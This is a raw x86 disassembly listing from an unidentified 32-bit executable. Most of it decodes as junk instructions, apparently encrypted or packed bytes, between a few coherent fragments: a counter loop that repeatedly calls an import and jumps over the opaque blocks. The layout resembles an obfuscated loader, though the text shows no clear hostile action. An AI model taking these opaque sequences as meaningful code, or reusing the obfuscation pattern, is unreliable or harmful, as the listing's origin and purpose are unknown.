  40e4d4:	pop    edx
  40e4d5:	xchg   ecx,eax
  40e4d6:	add    edi,DWORD PTR [esi+0xa39f480]
  40e4dc:	fisubr WORD PTR [ecx+0xff3fc00]
  40e4e2:	stos   DWORD PTR es:[edi],eax
  40e4e3:	retf   
  40e4e4:	fs push eax
  40e4e6:	adc    bh,BYTE PTR [esi-0x452ce4f2]
  40e4ec:	lds    ebp,FWORD PTR [edi+0x15825466]
  40e4f2:	sti    
  40e4f3:	push   es
  40e4f4:	test   eax,0xa039aa8f
  40e4f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4fa:	stos   DWORD PTR es:[edi],eax
  40e4fb:	dec    ebx
  40e4fc:	pop    ebx
  40e4fd:	les    edx,FWORD PTR [edi+0x5a]
  40e500:	mov    dl,0xdc
  40e502:	or     eax,0xede8c6de
  40e507:	xchg   edi,eax
  40e508:	rcr    DWORD PTR [ecx],0x1a
  40e50b:	ins    BYTE PTR es:[edi],dx
  40e50c:	mov    ecx,0xde8c3e5
  40e511:	shr    DWORD PTR [ebx+0x34],0x13
  40e515:	nop
  40e516:	jno    0x40e530
  40e518:	(bad)  
  40e519:	mov    ebp,0xaf828071
  40e51e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e51f:	dec    ecx
  40e520:	and    esi,esp
  40e522:	ins    BYTE PTR es:[edi],dx
  40e523:	stc    
  40e524:	pop    esp
  40e525:	inc    edx
  40e526:	mov    cl,0x11
  40e528:	imul   DWORD PTR [edx]
  40e52a:	ror    BYTE PTR [ebx],1
  40e52c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e52d:	retf   
  40e52e:	aaa    
  40e52f:	inc    ecx
  40e530:	je     0x40e4e7
  40e532:	push   edx
  40e533:	leave  
  40e534:	pop    eax
  40e535:	mov    eax,0x6135cdd5
  40e53a:	pop    esi
  40e53b:	shl    BYTE PTR [ecx+0x25b410b8],cl
  40e541:	push   0xffffffe0
  40e543:	adc    al,0x40
  40e545:	or     eax,0x4730ee55
  40e54a:	sub    BYTE PTR [ebp+0x3d],bh
  40e54d:	out    0x79,eax
  40e54f:	fadd   st,st(6)
  40e551:	sub    BYTE PTR [eax-0x59],ah
  40e554:	out    0x45,al
  40e556:	aas    
  40e557:	maxps  xmm7,XMMWORD PTR [ebx]
  40e55a:	xor    al,0x35
  40e55c:	iret   
  40e55d:	out    dx,eax
  40e55e:	cmp    BYTE PTR [ebx-0x49b45bab],al
  40e564:	fdivr  DWORD PTR [ebp+0x36]
  40e567:	cwde   
  40e568:	mov    ebp,DWORD PTR [ebx-0x2c5a3d3f]
  40e56e:	int3   
  40e56f:	scas   eax,DWORD PTR es:[edi]
  40e570:	je     0x40e553
  40e572:	inc    edi
  40e573:	ret    
  40e574:	mov    ch,0x4b
  40e576:	jnp    0x40e503
  40e578:	mov    bl,0xe
  40e57a:	ret    
  40e57b:	jp     0x40e54f
  40e57d:	xchg   ecx,eax
  40e57e:	arpl   WORD PTR [edx],dx
  40e580:	out    0x4a,al
  40e582:	mov    edx,0x1f039e56
  40e587:	push   cs
  40e588:	pop    ebp
  40e589:	and    BYTE PTR [edi],bl
  40e58b:	cmp    al,0x75
  40e58d:	push   edi
  40e58e:	cmp    ah,BYTE PTR [ecx]
  40e590:	lds    ecx,FWORD PTR [edx]
  40e592:	jne    0x40e5dd
  40e594:	mov    BYTE PTR [ebp+0x46],al
  40e597:	push   eax
  40e598:	adc    ebx,ebp
  40e59a:	or     eax,0x73a657f5
  40e59f:	pop    esi
  40e5a0:	and    eax,0xa9795c7c
  40e5a5:	sub    al,dl
  40e5a7:	fild   QWORD PTR [edx]
  40e5a9:	icebp  
  40e5aa:	sub    DWORD PTR cs:[edx+0x16039736],eax
  40e5b1:	xor    DWORD PTR [ecx],ebp
  40e5b3:	sub    eax,0xa75451d
  40e5b8:	hlt    
  40e5b9:	push   ecx
  40e5ba:	rcr    DWORD PTR ds:[ebx],1
  40e5bd:	retf   
  40e5be:	not    BYTE PTR [edi-0x6d256f1f]
  40e5c4:	mov    ebp,0x2af8beec
  40e5c9:	test   DWORD PTR [esi],0xd3a96f98
  40e5cf:	sub    DWORD PTR [ebx-0x53c1d89f],esp
  40e5d5:	fld    st(1)
  40e5d7:	sub    bh,BYTE PTR [edi]
  40e5d9:	fcomip st,st(7)
  40e5db:	jg     0x40e57f
  40e5dd:	pop    ebx
  40e5de:	jbe    0x40e618
  40e5e0:	sub    ecx,ecx
  40e5e2:	scas   al,BYTE PTR es:[edi]
  40e5e3:	and    cl,BYTE PTR [ebx+edx*4]
  40e5e6:	femms  
  40e5e8:	inc    ecx
  40e5e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5ea:	xor    al,0x7c
  40e5ec:	idiv   BYTE PTR [eax-0x4c62c5e6]
  40e5f2:	(bad)
  40e5f5:	add    ebx,DWORD PTR [edx+ecx*2-0x32]
  40e5f9:	aaa    
  40e5fa:	loopne 0x40e669
  40e5fc:	cmp    DWORD PTR [edx],edx
  40e5fe:	imul   ebp,DWORD PTR [esi-0xeda3f52],0x47df53f
  40e608:	loope  0x40e5e9
  40e60a:	cmp    eax,0x34328165
  40e60f:	lea    edi,[ecx+0x35f09738]
  40e615:	or     eax,0x838fde50
  40e61a:	sti    
  40e61b:	inc    bl
  40e61d:	push   cs
  40e61e:	out    0xea,eax
  40e620:	inc    eax
  40e621:	sub    edx,edx
  40e623:	or     dh,bh
  40e625:	int    0xa6
  40e627:	inc    ecx
  40e628:	mov    bh,0xac
  40e62a:	and    bl,BYTE PTR [esi+0x67]
  40e62d:	out    dx,al
  40e62e:	push   ecx
  40e62f:	sbb    al,0xfa
  40e631:	push   ecx
  40e632:	sub    DWORD PTR [ecx+0x7b],edi
  40e635:	inc    esi
  40e636:	imul   DWORD PTR ds:0x2ac7418f
  40e63c:	adc    BYTE PTR ds:0xcde70c55,dh
  40e642:	jb     0x40e659
  40e644:	jp     0x40e6aa
  40e646:	rcl    DWORD PTR [ebx],1
  40e648:	and    DWORD PTR [edx],edi
  40e64a:	cmp    al,0x24
  40e64c:	lds    edi,FWORD PTR [ebp+0x61cfea46]
  40e652:	lock and al,0xc5
  40e655:	pop    ebx
  40e656:	aaa    
  40e657:	hlt    
  40e658:	setae  dh
  40e65b:	mov    esi,0x9fee34d1
  40e660:	dec    edi
  40e662:	mov    DWORD PTR [edi+0x77],esi
  40e665:	pop    edx
  40e666:	sub    BYTE PTR [ebp+0x2a1495f2],dl
  40e66c:	(bad)  [edi+0x6e]
  40e66f:	xchg   ecx,eax
  40e670:	mov    eax,0xf4df6768
  40e675:	shr    ebx,0x45
  40e678:	inc    ebp
  40e679:	sbb    al,0x26
  40e67b:	scas   al,BYTE PTR es:[edi]
  40e67c:	retf   
  40e67d:	jno    0x40e6f6
  40e67f:	gs iret 
  40e681:	icebp  
  40e682:	pop    esp
  40e683:	sbb    eax,0x48e1962f
  40e688:	loop   0x40e63e
  40e68a:	aaa    
  40e68b:	stos   DWORD PTR es:[edi],eax
  40e68c:	gs es iret 
  40e68f:	cmp    al,0x80
  40e691:	inc    esp
  40e692:	mov    DWORD PTR [ebx+0x64],esp
  40e695:	ss pop ebp
  40e697:	sub    edx,ebx
  40e699:	xor    DWORD PTR [edx+0x18],edi
  40e69c:	outs   dx,DWORD PTR ds:[esi]
  40e69d:	retf   0x6fa1
  40e6a0:	sahf   
  40e6a1:	pushf  
  40e6a2:	cmp    eax,0x6867c220
  40e6a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6a8:	jo     0x40e656
  40e6aa:	mov    eax,ds:0xe0f798cc
  40e6af:	out    0xe9,eax
  40e6b1:	adc    DWORD PTR [eax+edx*2],0xffffffb3
  40e6b5:	mov    BYTE PTR [ebp+0x5c],cl
  40e6b8:	jne    0x40e6f8
  40e6ba:	(bad)  
  40e6bb:	loopne 0x40e6cf
  40e6bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6be:	aam    0x45
  40e6c0:	inc    esi
  40e6c1:	bound  edx,QWORD PTR [ebx+0x2]
  40e6c4:	xchg   ebx,eax
  40e6c5:	add    dl,BYTE PTR [esi]
  40e6c7:	clc    
  40e6c8:	aaa    
  40e6c9:	mov    dh,0xba
  40e6cb:	adc    BYTE PTR [eax+0x1a],bl
  40e6ce:	sbb    bh,bl
  40e6d0:	pusha  
  40e6d1:	into   
  40e6d2:	scas   eax,DWORD PTR es:[edi]
  40e6d3:	ds jmp 0xb1f631ff
  40e6d9:	ja     0x40e6bf
  40e6db:	shl    WORD PTR [ecx],cl
  40e6de:	aaa    
  40e6df:	jae    0x40e6aa
  40e6e1:	adc    DWORD PTR [ebp-0xc],ebx
  40e6e4:	lods   eax,DWORD PTR ds:[esi]
  40e6e5:	add    al,0x84
  40e6e7:	push   ebp
  40e6e8:	xchg   esp,eax
  40e6e9:	mov    bl,0x61
  40e6eb:	jne    0x40e6df
  40e6ed:	sub    eax,0xb1c6145c
  40e6f2:	or     DWORD PTR [ecx+0x19],edx
  40e6f5:	(bad)  
  40e6f6:	fidiv  WORD PTR [ebp+0x1d]
  40e6f9:	(bad)  
  40e6fa:	pop    es
  40e6fb:	mov    edx,0xc63321fc
  40e700:	add    eax,ebx
  40e702:	mov    DWORD PTR [ebp+0x8],eax
  40e705:	mov    eax,ds:0x41eae6
  40e70a:	mov    DWORD PTR [ebp+0x8],eax
  40e70d:	mov    eax,DWORD PTR [ebp-0x14]
  40e710:	mov    DWORD PTR [ebp-0x4],eax
  40e713:	mov    eax,DWORD PTR [ebp-0x4]
  40e716:	push   0x4
  40e718:	pop    ecx
  40e719:	sub    ecx,eax
  40e71b:	add    ecx,DWORD PTR [ebp-0x18]
  40e71e:	mov    DWORD PTR [ebp-0x8],ecx
  40e721:	jmp    0x40e979
  40e726:	(bad)
  40e729:	(bad)  
  40e72a:	leave  
  40e72b:	fcmovbe st,st(5)
  40e72d:	sar    esp,1
  40e72f:	rcr    DWORD PTR [esp+edi*1],1
  40e732:	repz dec eax
  40e734:	xchg   esp,eax
  40e735:	sbb    BYTE PTR [edi],bh
  40e737:	mov    ebx,0x7e357878
  40e73c:	js     0x40e7b6
  40e73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e73f:	pop    ds
  40e740:	fnsave [ebx+0x381e5cb8]
  40e746:	pop    ds
  40e747:	(bad)  
  40e748:	sub    eax,0x41904415
  40e74d:	mov    cl,bh
  40e74f:	clc    
  40e750:	push   ebx
  40e751:	into   
  40e752:	(bad)
  40e755:	xchg   ebx,eax
  40e756:	mov    dl,0xae
  40e758:	mov    ebp,0x2cc071ea
  40e75d:	jg     0x40e791
  40e75f:	pop    ebp
  40e760:	or     ebp,esi
  40e762:	scas   al,BYTE PTR es:[edi]
  40e763:	js     0x40e71e
  40e765:	aas    
  40e766:	scas   al,BYTE PTR es:[edi]
  40e767:	adc    bh,BYTE PTR [esi-0x1a38c03d]
  40e76d:	inc    esp
  40e76e:	cmp    edi,DWORD PTR [ebp+0x62]
  40e771:	adc    BYTE PTR [esi+0x1efbe248],bl
  40e777:	adc    eax,DWORD PTR [ebp+0x42]
  40e77a:	add    BYTE PTR [edi],ah
  40e77c:	shl    bl,1
  40e77e:	test   DWORD PTR [esi-0x5b],edi
  40e781:	push   DWORD PTR [ecx-0x40]
  40e784:	mov    ds:0x325f9bcc,eax
  40e789:	pushf  
  40e78a:	test   eax,0x541a7bd6
  40e78f:	mov    ds:0x936ad55a,al
  40e794:	sub    BYTE PTR [edi-0x2a7350b8],dh
  40e79a:	fistp  QWORD PTR [eax+0x1049c1a7]
  40e7a1:	fisubr DWORD PTR [edx-0x3a96448b]
  40e7a7:	or     al,0x67
  40e7a9:	sti    
  40e7aa:	ficom  DWORD PTR [ebx+0x24da3b1d]
  40e7b0:	or     esi,DWORD PTR [edx]
  40e7b2:	scas   al,BYTE PTR es:[edi]
  40e7b3:	fistp  DWORD PTR [esi]
  40e7b5:	pushf  
  40e7b6:	mov    dh,0xc0
  40e7b8:	sbb    ecx,eax
  40e7ba:	mov    ebx,0xe210f73e
  40e7bf:	or     ebx,eax
  40e7c1:	cmp    BYTE PTR [ebx-0x1],dh
  40e7c4:	sub    bl,ch
  40e7c6:	lods   al,BYTE PTR ds:[esi]
  40e7c7:	lods   al,BYTE PTR ds:[esi]
  40e7c8:	(bad)  
  40e7c9:	lds    esp,FWORD PTR [edi]
  40e7cb:	hlt    
  40e7cc:	sub    BYTE PTR [edi],0xee
  40e7cf:	and    al,0xa9
  40e7d1:	(bad)  
  40e7d2:	mov    bl,0xdf
  40e7d4:	iret   
  40e7d5:	arpl   WORD PTR [esi],cx
  40e7d7:	or     DWORD PTR [ecx+0x7674cbd3],0xe27bded5
  40e7e1:	sbb    edx,DWORD PTR ds:0xbcbc1d94
  40e7e7:	aaa    
  40e7e8:	jbe    0x40e7a2
  40e7ea:	enter  0x77af,0x33
  40e7ee:	sub    BYTE PTR [esi+0x64e24faf],0xe5
  40e7f5:	jne    0x40e7a4
  40e7f7:	lods   eax,DWORD PTR ds:[esi]
  40e7f8:	cs pop edi
  40e7fa:	pop    ss
  40e7fb:	dec    edx
  40e7fc:	(bad)  
  40e7fd:	clc    
  40e7fe:	xchg   BYTE PTR [esi+0x30],dl
  40e801:	ficom  DWORD PTR [ebp+0x63555c5b]
  40e807:	fs jno 0x40e805
  40e80a:	jns    0x40e81f
  40e80c:	aaa    
  40e80d:	mov    esp,0x5f543d02
  40e812:	push   ebx
  40e813:	mov    bl,0xf
  40e815:	sub    ax,cx
  40e818:	xchg   edx,eax
  40e819:	js     0x40e886
  40e81b:	bound  edi,QWORD PTR [esi+eiz*8+0x24]
  40e81f:	leave  
  40e820:	imul   ebx,DWORD PTR [esi-0x7a0dcdb6],0x9f8bda8d
  40e82a:	cmp    dl,0x14
  40e82d:	xor    DWORD PTR [edx],0xffffffe9
  40e830:	outs   dx,BYTE PTR ds:[esi]
  40e831:	shr    esp,1
  40e833:	xchg   edx,eax
  40e834:	push   ecx
  40e835:	dec    ebp
  40e836:	lods   eax,DWORD PTR ds:[esi]
  40e837:	xchg   ebx,eax
  40e838:	add    eax,0xffffff8b
  40e83b:	xlat   BYTE PTR ds:[ebx]
  40e83c:	push   cs
  40e83d:	int3   
  40e83e:	jp     0x40e7d3
  40e840:	xor    eax,edx
  40e842:	popf   
  40e843:	push   ds
  40e844:	mov    ebx,0xcf71be27
  40e849:	push   eax
  40e84a:	fst    DWORD PTR [eax+0x69]
  40e84d:	aad    0xe1
  40e84f:	sbb    DWORD PTR [edx-0x75],edi
  40e852:	add    cl,BYTE PTR [esi-0x1844f26]
  40e858:	jnp    0x40e830
  40e85a:	scas   al,BYTE PTR es:[edi]
  40e85b:	xchg   ebx,eax
  40e85c:	mov    esi,0xa714023e
  40e861:	sbb    DWORD PTR [ebx-0x3786b387],edx
  40e867:	pop    esi
  40e868:	rcr    bl,0xf9
  40e86b:	(bad)  
  40e86c:	jne    0x40e8c7
  40e86e:	in     eax,0xf9
  40e870:	xchg   ebx,eax
  40e871:	aas    
  40e872:	test   eax,0xf7919516
  40e877:	dec    esp
  40e878:	inc    ebx
  40e879:	scas   eax,DWORD PTR es:[edi]
  40e87a:	leave  
  40e87b:	push   ss
  40e87c:	cmc    
  40e87d:	push   ds
  40e87e:	xor    bl,bl
  40e880:	lock dec esp
  40e882:	call   0xe4a566f2
  40e887:	or     DWORD PTR [esi],esp
  40e889:	mov    al,ds:0x3367a828
  40e88e:	aaa    
  40e88f:	sub    DWORD PTR [ebx],esi
  40e891:	push   ss
  40e892:	pop    eax
  40e893:	jl     0x40e8b8
  40e895:	pop    ecx
  40e896:	sbb    esi,eax
  40e898:	inc    ebx
  40e899:	aaa    
  40e89a:	mov    edi,0x229c5fc2
  40e89f:	retf   0x465c
  40e8a2:	repnz imul ebx,ecx,0xfdc6c39a
  40e8a9:	aad    0x9b
  40e8ab:	and    esi,edi
  40e8ad:	and    dh,BYTE PTR [ebx]
  40e8af:	call   0x6ec5:0xe5b733ba
  40e8b6:	mov    edi,DWORD PTR [edi]
  40e8b8:	sub    eax,0x7c80f972
  40e8bd:	inc    edi
  40e8be:	mov    eax,ds:0x48be3dbb
  40e8c3:	fcom   st(3)
  40e8c5:	std    
  40e8c6:	xchg   edx,eax
  40e8c7:	fistp  WORD PTR [ebx-0x282d4be8]
  40e8cd:	outs   dx,DWORD PTR ds:[esi]
  40e8ce:	cmp    eax,0x6ab21ca5
  40e8d3:	jae    0x40e8af
  40e8d5:	mov    ecx,0x86667299
  40e8da:	and    al,0x52
  40e8dc:	push   cs
  40e8dd:	imul   ebp,DWORD PTR [esi-0x5086cf9b],0x75776c9
  40e8e7:	ror    BYTE PTR [ecx+esi*1-0x56],0x15
  40e8ec:	cwde   
  40e8ed:	mov    ds:0xa885765b,al
  40e8f2:	imul   eax,ebp,0xbe4aeca8
  40e8f8:	leave  
  40e8f9:	lods   eax,DWORD PTR ds:[esi]
  40e8fa:	loope  0x40e972
  40e8fc:	aad    0x18
  40e8fe:	pop    ebx
  40e8ff:	das    
  40e900:	test   dh,bl
  40e902:	or     BYTE PTR [edx],cl
  40e904:	sub    BYTE PTR [edi],dl
  40e906:	inc    edx
  40e907:	mov    ah,0xd5
  40e909:	mov    edx,0xa8ffccc3
  40e90e:	rol    eax,1
  40e910:	mov    al,0xc4
  40e912:	in     eax,dx
  40e913:	jg     0x40e8a7
  40e915:	sbb    BYTE PTR [edx],al
  40e917:	aaa    
  40e918:	sub    eax,0x9eb6b8d1
  40e91d:	adc    BYTE PTR [ebp+0x13954f9e],al
  40e923:	jb     0x40e928
  40e925:	inc    eax
  40e926:	mov    edi,0xfd961202
  40e92b:	cmp    BYTE PTR [edx+0x63],bh
  40e92e:	sub    ah,ah
  40e930:	or     dl,BYTE PTR [edx+ebp*8+0x42]
  40e934:	dec    ecx
  40e935:	enter  0x8aad,0x5e
  40e939:	jnp    0x40e8dd
  40e93b:	pop    edx
  40e93c:	xchg   edx,eax
  40e93d:	or     cl,BYTE PTR [ebp+0x0]
  40e940:	sub    al,0x60
  40e942:	or     al,dl
  40e944:	push   0x7c
  40e946:	hlt    
  40e947:	cmp    ch,BYTE PTR [ecx+0x5ebcb8fe]
  40e94d:	jl     0x40e942
  40e94f:	out    dx,eax
  40e950:	pop    esp
  40e951:	int    0x16
  40e953:	push   ebp
  40e954:	rcr    BYTE PTR ds:0xeccea07f,cl
  40e95a:	mov    bl,0xf1
  40e95c:	sar    DWORD PTR [edx+0x1f],1
  40e95f:	scas   al,BYTE PTR es:[edi]
  40e960:	mov    esp,?
  40e962:	pop    edx
  40e963:	adc    DWORD PTR [edi],0x10
  40e966:	jmp    0x40e94d
  40e968:	aam    0x86
  40e96a:	dec    ebp
  40e96b:	nop
  40e96c:	and    al,0x3f
  40e96e:	fsubr  QWORD PTR ds:[edi]
  40e971:	scas   eax,DWORD PTR es:[edi]
  40e972:	xor    al,0x12
  40e974:	fwait
  40e975:	retf   
  40e976:	retf   
  40e977:	stc    
  40e978:	lods   al,BYTE PTR ds:[esi]
  40e979:	mov    eax,DWORD PTR [ebp+0xc]
  40e97c:	xor    eax,esi
  40e97e:	lea    edi,[edi+eax*1+0x327298]
  40e985:	cmp    edi,0x50a
  40e98b:	jne    0x40d51f
  40e991:	mov    eax,DWORD PTR [ebp+0xc]
  40e994:	pop    edi
  40e995:	xor    eax,esi
  40e997:	pop    esi
  40e998:	add    eax,ebx
  40e99a:	pop    ebx
  40e99b:	leave  
  40e99c:	ret    0x8
  40e99f:	push   ebp
  40e9a0:	mov    ebp,esp
  40e9a2:	sub    esp,0x44
  40e9a5:	push   edi
  40e9a6:	mov    eax,DWORD PTR [ebp+0xc]
  40e9a9:	mov    DWORD PTR [ebp-0x10],eax
  40e9ac:	mov    eax,DWORD PTR [ebp+0x8]
  40e9af:	and    DWORD PTR ds:0x42a7f1,0x0
  40e9b9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9bf:	inc    edx
  40e9c0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9c6:	cmp    DWORD PTR ds:0x42a7f1,0x6
  40e9cd:	jne    0x40e9dc
  40e9d3:	push   DWORD PTR [ebp-0x28]
  40e9d6:	call   DWORD PTR ds:0x41d250
  40e9dc:	cmp    DWORD PTR ds:0x42a7f1,0x5
  40e9e3:	jne    0x40e9f6
  40e9e9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9ef:	inc    edx
  40e9f0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9f6:	cmp    DWORD PTR ds:0x42a7f1,0x10
  40e9fd:	jb     0x40e9b9
  40ea03:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  40ea0a:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40ea11:	jmp    0x40ec99
  40ea16:	cmp    eax,0xd6ce3ed7
  40ea1b:	aad    0xcd
  40ea1d:	xlat   BYTE PTR ds:[ebx]
  40ea1e:	jecxz  0x40e9ce
  40ea20:	ja     0x40e9b6
  40ea22:	pop    ecx
  40ea23:	jnp    0x40ea59
  40ea25:	pop    ds
  40ea26:	hlt    
  40ea27:	mov    ecx,0x7ee57878
  40ea2c:	js     0x40eaa6
  40ea2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea2f:	aas    
  40ea30:	cmc    
  40ea31:	mov    esp,0x6a5081e
  40ea36:	dec    edx
  40ea37:	std    
  40ea38:	adc    ecx,esi
  40ea3a:	aad    0x6c
  40ea3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea3d:	sbb    edi,DWORD PTR [eax+0x58]
  40ea40:	xor    DWORD PTR ds:0xe4998090,esp
  40ea46:	mov    WORD PTR ds:0x88a5e530,gs
  40ea4c:	in     eax,0x3d
  40ea4e:	(bad)  
  40ea4f:	std    
  40ea50:	mov    ah,0x3e
  40ea52:	jecxz  0x40ea5f
  40ea54:	ss aas 
  40ea56:	xchg   DWORD PTR [esi],esp
  40ea58:	cmp    eax,0x85890f5a
  40ea5d:	cwde   
  40ea5e:	int3   
  40ea5f:	xchg   esi,eax
  40ea60:	out    dx,al
  40ea61:	shr    edi,0x58
  40ea64:	loope  0x40e9ed
  40ea66:	je     0x40ea66
  40ea68:	ins    BYTE PTR es:[edi],dx
  40ea69:	test   al,0x59
  40ea6b:	push   ds
  40ea6c:	lods   al,BYTE PTR ds:[esi]
  40ea6d:	jno    0x40ea42
  40ea6f:	jo     0x40ea8c
  40ea71:	vmaxsd xmm3,xmm5,QWORD PTR [edx]
  40ea76:	inc    ebp
  40ea77:	shl    DWORD PTR [eax+0x74],0x1d
  40ea7b:	and    eax,0xb3e173dc
  40ea80:	dec    eax
  40ea81:	jp     0x40ea94
  40ea83:	adc    al,0x1b
  40ea85:	sti    
  40ea86:	xchg   ebp,eax
  40ea87:	fild   DWORD PTR [edi+0x14e2534c]
  40ea8d:	jg     0x40ea48
  40ea8f:	cmp    al,0xb6
  40ea91:	sub    DWORD PTR [eax+0x61],0xcce0d9cd
  40ea98:	jge    0x40eaaf
  40ea9a:	jecxz  0x40ea83
  40ea9c:	jecxz  0x40eadf
  40ea9e:	int3   
  40ea9f:	mov    edx,0xb68bad15
  40eaa4:	jge    0x40ea42
  40eaa6:	xchg   ecx,eax
  40eaa7:	push   ebp
  40eaa8:	xor    DWORD PTR [ecx],0xffffff85
  40eaab:	add    eax,0x6a646879
  40eab0:	xor    al,0x1b
  40eab2:	dec    esi
  40eab3:	mov    eax,0xe769a58a
  40eab8:	lods   eax,DWORD PTR ds:[esi]
  40eab9:	jb     0x40eb15
  40eabb:	adc    al,0x85
  40eabd:	(bad)  
  40eabe:	cmp    al,0xc9
  40eac0:	std    
  40eac1:	sbb    edx,DWORD PTR [esi]
  40eac3:	xchg   ecx,eax
  40eac4:	dec    edi
  40eac5:	adc    edx,0x2a
  40eac8:	push   0x4f
  40eaca:	std    
  40eacb:	jbe    0x40ea59
  40eacd:	push   ecx
  40eace:	outs   dx,BYTE PTR ds:[esi]
  40eacf:	retf   
  40ead0:	loopne 0x40ea88
  40ead2:	mov    al,ds:0x7b8a69bd
  40ead7:	sbb    al,bl
  40ead9:	inc    esi
  40eada:	add    eax,0x67328285
  40eadf:	ss fs aad 0xa2
  40eae3:	xlat   BYTE PTR ds:[ebx]
  40eae4:	int    0xbb
  40eae6:	retf   
  40eae7:	mov    WORD PTR [edi+edx*4-0x1fb2f75a],cs
  40eaee:	mov    ?,WORD PTR [ebx-0x3895baa1]
  40eaf4:	fs pop edi
  40eaf6:	arpl   WORD PTR [esi+0x2b495d25],ax
  40eafc:	mov    ecx,ss
  40eafe:	lods   al,BYTE PTR gs:[esi]
  40eb00:	fwait
  40eb01:	inc    edx
  40eb02:	mov    ch,0xce
  40eb04:	stos   BYTE PTR es:[edi],al
  40eb05:	push   ds
  40eb06:	aaa    
  40eb07:	adc    al,0x68
  40eb09:	loop   0x40eb45
  40eb0b:	add    ch,bh
  40eb0d:	cli    
  40eb0e:	pop    edi
  40eb0f:	lods   al,BYTE PTR ds:[esi]
  40eb10:	adc    BYTE PTR [edx+edi*2],0xf8
  40eb14:	mov    bh,0xbf
  40eb16:	in     eax,dx
  40eb17:	or     BYTE PTR [edx-0x4c],bl
  40eb1a:	(bad)  
  40eb1c:	shr    DWORD PTR [ebp+ebx*8-0x7c5b6561],1
  40eb23:	xchg   ecx,eax
  40eb24:	ds or  eax,0xf449951c
  40eb2a:	in     eax,dx
  40eb2b:	add    al,0x5b
  40eb2d:	mov    bh,0x3a
  40eb2f:	fs xchg esi,eax
  40eb31:	adc    eax,0xc79f2398
  40eb36:	xchg   ecx,eax
  40eb37:	das    
  40eb38:	pusha  
  40eb39:	ss jle 0x40eaec
  40eb3c:	xchg   ebp,eax
  40eb3d:	call   0x2cb0e1c9
  40eb42:	(bad)  
  40eb43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb45:	nop
  40eb46:	adc    bl,ah
  40eb48:	add    al,0xab
  40eb4a:	pop    edi
  40eb4b:	outs   dx,DWORD PTR ds:[esi]
  40eb4c:	mov    es,WORD PTR [ebx-0x16]
  40eb4f:	lahf   
  40eb50:	dec    ebp
  40eb51:	in     eax,dx
  40eb52:	mov    esp,0x6d1451a3
  40eb57:	mov    edx,0x116e7bcd
  40eb5c:	ins    BYTE PTR es:[edi],dx
  40eb5d:	add    eax,0xec6455b
  40eb62:	xchg   edi,eax
  40eb63:	jnp    0x40eb51
  40eb65:	in     eax,dx
  40eb66:	adc    al,0x8d
  40eb68:	sbb    eax,0x2d4edf6b
  40eb6d:	jne    0x40ebea
  40eb6f:	popa   
  40eb70:	add    bl,BYTE PTR [edi+ebx*4+0x46]
  40eb74:	mov    bl,BYTE PTR [edi-0x616802f7]
  40eb7a:	inc    ebx
  40eb7b:	adc    dl,BYTE PTR [edi-0x5e1cc50a]
  40eb81:	inc    ebx
  40eb82:	and    eax,0x9cadb879
  40eb87:	push   ebp
  40eb88:	jle    0x40eb49
  40eb8a:	pop    ds
  40eb8b:	sar    BYTE PTR [ecx],1
  40eb8d:	test   DWORD PTR [ebp-0x5b929f4d],edi
  40eb93:	ret    
  40eb94:	and    cl,dl
  40eb96:	cld    
  40eb97:	(bad)  
  40eb98:	loop   0x40eb1d
  40eb9a:	xchg   ebp,eax
  40eb9b:	fldcw  WORD PTR [ebp+0x1caab4d8]
  40eba1:	loope  0x40eb3f
  40eba3:	test   eax,0xb44312a
  40eba8:	mov    ds:0xc3387256,eax
  40ebad:	push   0x484d276f
  40ebb2:	int3   
  40ebb3:	pop    edx
  40ebb4:	in     eax,dx
  40ebb5:	call   0x4753:0x7d66b5f5
  40ebbc:	jb     0x40ebdd
  40ebbe:	xor    DWORD PTR [ebp-0x541b6171],ebx
  40ebc4:	jne    0x40ebd5
  40ebc6:	int    0x32
  40ebc8:	int3   
  40ebc9:	xchg   DWORD PTR [ebp-0xf81142c],esp
  40ebcf:	in     eax,0x26
  40ebd1:	fdiv   QWORD PTR [ecx+0x58]
  40ebd4:	sbb    eax,DWORD PTR [ebp-0x4f]
  40ebd7:	or     BYTE PTR [eax-0x21],0xb3
  40ebdb:	sbb    eax,0xc93f79ba
  40ebe0:	push   ss
  40ebe1:	and    edx,edi
  40ebe3:	dec    eax
  40ebe4:	repnz cmp esp,DWORD PTR [eax+0x30]
  40ebe8:	cmp    BYTE PTR [ecx-0x34204e74],dl
  40ebee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebef:	xchg   ebp,eax
  40ebf0:	adc    eax,0xbcdd4cbe
  40ebf5:	xor    ecx,DWORD PTR [edx+0x53]
  40ebf8:	aad    0xbd
  40ebfa:	cmc    
  40ebfb:	int3   
  40ebfc:	push   ss
  40ebfd:	push   eax
  40ebfe:	sbb    ah,al
  40ec00:	xchg   edi,eax
  40ec01:	dec    ecx
  40ec02:	pop    ecx
  40ec03:	push   ebp
  40ec04:	addr16 in al,0x60
  40ec07:	add    eax,edi
  40ec09:	mov    edx,0x4156a9b0
  40ec0e:	rcl    ecx,0x27
  40ec11:	sbb    edx,ebp
  40ec13:	xor    BYTE PTR [edx],ch
  40ec15:	mov    dl,BYTE PTR [esi+0x3c]
  40ec18:	test   eax,0xc43d5b7
  40ec1d:	sub    eax,0xdddb62df
  40ec22:	mov    ebp,0x3aa11964
  40ec27:	xchg   edx,eax
  40ec28:	push   ebp
  40ec29:	jge    0x40ec35
  40ec2b:	pop    ebp
  40ec2c:	add    ah,BYTE PTR [edi-0x353c6eee]
  40ec32:	and    bh,bh
  40ec34:	jge    0x40ec9e
  40ec36:	and    DWORD PTR [edi],ebx
  40ec38:	jo     0x40ebf2
